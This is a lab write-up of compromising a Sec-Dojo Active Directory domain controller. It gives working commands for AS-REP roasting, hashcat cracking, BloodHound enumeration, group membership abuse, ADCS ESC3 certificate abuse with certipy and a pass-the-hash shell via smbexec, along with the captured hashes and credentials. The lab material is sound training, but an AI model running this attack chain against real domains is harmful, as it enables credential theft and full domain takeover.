

starting with nmap 

```bash
sudo nmap 10.8.0.2 -sC -sV -p- -oN nmap -T4
```

![[Pasted image 20241011181947.png]]




so it's a DC with an open web page on port 80


by reading the HTML code of page , I found the format of users in the Domain 

`Em.Br`
```HTML
  <!-- Footer-->
    <footer id="contact" class="py-5 bg-black">
        <div class="container px-5">
            <p class="m-0 text-center text-white small"><a href="[mailto:Em.Br@secdojo.local](mailto:Em.Br@secdojo.local)" class="text-white">Email us</a></p>
            <p class="m-0 text-center text-white small">Copyright &copy; Sec-Dojo 2024</p>
        </div>
    </footer>
    <!-- Bootstrap core JS-->
    <script src="[js/bootstrap.bundle.min.js](view-source:http://10.8.0.2/js/bootstrap.bundle.min.js)"></script>
    <!-- Core theme JS-->
    <script src="[js/scripts.js](view-source:http://10.8.0.2/js/scripts.js)"></script>
</body>
</html>
```

 I make a wordlist with all the users in the website using the  same format 

```txt
Em.Br
Ad.Cr
Bo.Jo
```


the only attacks that comes in my mind at this moment is asreproasting 

```bash
impacket-GetNPUsers secdojo.local/ -usersfile users  -outputfile asrep
```

![[Pasted image 20241011180718.png]]

```bash
 hashcat -a 0 asrep /usr/share/wordlists/rockyou.txt

$krb5asrep$23$Ad.Cr@SECDOJO.LOCAL:d51be14d3aa50cb4f878950c397fd52c$f6861835364bb255acdcf9cb14e162e410a8ce07597fed7fafc410ed59b3cab97255441f8b652e6a63951e183ea7b759f6a7f5e73762c8d535316b891ef5c47fbf9350c525713fa067ab80329803e8fb6a37548eaf1f14cc5d39d0f9897c0a84335f0edc83c6a8a65d89c132ac345c2693825d9dd554f563fa908213672fcd2153e24283ad59f3040a194352a46b95646922542ea37a7be06f17478fcdbe0e18e1ce6340b73707dc3a08b1f1eb1dc2f7154ecfb5315b166ebf859139aafbbf4986a3181a0e44b95b6327e9df8edb4412b0aa6a927c5c6ed7511b1984bd9884f9b4e5c1a9ce437acf6715fd07f804:RockYou!
```


after enumerating the shares , ADCS nothing really interesting 

so let's see bloodhound
```bash
RustHound/target/release/rusthound  -d secdojo.local -u 'Ad.Cr@secdojo.local' -p 'RockYou!'   -z
```

taking a look at bloodhound

![[Pasted image 20241011181025.png]]


we can add our controlled user to `HELPDESK Group`

```bash
net rpc group addmem "HelpDesk" "AD.CR" -U "secdojo.local"/"AD.CR"%"RockYou\!" -S "10.8.0.2"
```

well , I was stuck here for long time 

remember skid : enumeration is iterative process which means when you got new user / group ...

I should redo the whole enumeration again , (Including ADCS).

when running ==Certipy== at first it didn't catch the ==ESC3== , after adding my user to ==helpdesk ==user it does  

```bash
certipy-ad find -u Ad.Cr -p 'RockYou!' -stdout  -dc-ip 10.8.0.2
```

![[Pasted image 20241011182048.png]]

```bash
certipy-ad req -u 'Ad.Cr@secdojo.local' -p 'RockYou!' -ca 'SecDojoRootCA' -template 'Enrollement' -dc-ip 10.8.0.2
```

![[Pasted image 20241011182150.png]]

```bash
certipy-ad req -u 'Ad.Cr@secodjo.local' -p 'RockYou!' -ca 'SecDojoRootCA'  -template 'User' -on-behalf-of 'administrator' -pfx ad.cr.pfx -dc-ip 10.8.0.2
```

![[Pasted image 20241011182250.png]]

```bash
 certipy-ad auth -pfx administrator.pfx
```

![[Pasted image 20241011182314.png]]


the stupid AV will catch psexec
```bash
impacket-smbexec secdojo.local/Administrator@10.8.0.2  -hashes :91c49c1fad45e7b9dbdcd7d3c44a880d
```

![[Pasted image 20241011183756.png]]

